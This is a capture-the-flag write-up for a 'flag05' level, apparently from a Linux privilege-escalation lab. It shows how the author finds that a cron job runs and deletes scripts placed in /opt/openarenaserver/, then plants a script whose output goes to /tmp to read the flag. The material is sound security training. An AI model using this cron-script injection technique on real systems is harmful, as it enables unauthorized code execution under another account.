`ls` returns nothing

`find / -user flag05 2>/dev/null` </br>
finds: </br>
`/usr/sbin/openarenaserver` </br>
`/rofs/usr/sbin/openarenaserver`

`cd /usr/sbin && ls -l openarenaserver` </br>
gives: </br>
`-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 openarenaserver`

The file has ACLs extended permissions. We can do `getfacl openarenaserver` to see them.</br>
Doesn't seems to be helpful here.

`cat openarenaserver` </br>
For each file in `/opt/openarenaserver/` it will execute it then supress it.

`Invoking a Bash shell with the -x option causes each shell command to be printed before it is executed.` </br>
https://docs.actian.com/vector/4.2/index.html#page/SysAdmin/Bash_Shell_-x_Option.htm
`ulimit: user limits - limit the use of system-wide resources. -t The maximum amount of cpu time in seconds.`

We can't execute `openarenaserver` however the files I created to test stuff in `/opt/openarenaserver/` disappeared after a while, `openarenaserver` seems to be launched by a cronjob or something.

Creating a file with `echo "getflag" > /opt/openarenaserver/getflag` and waiting for the program to be launch didn't do anything. Maybe redirect the output somewhere can work.

`echo "getflag > /tmp/prout" > /opt/openarenaserver/getflag` then `cat /tmp/prout` did the trick
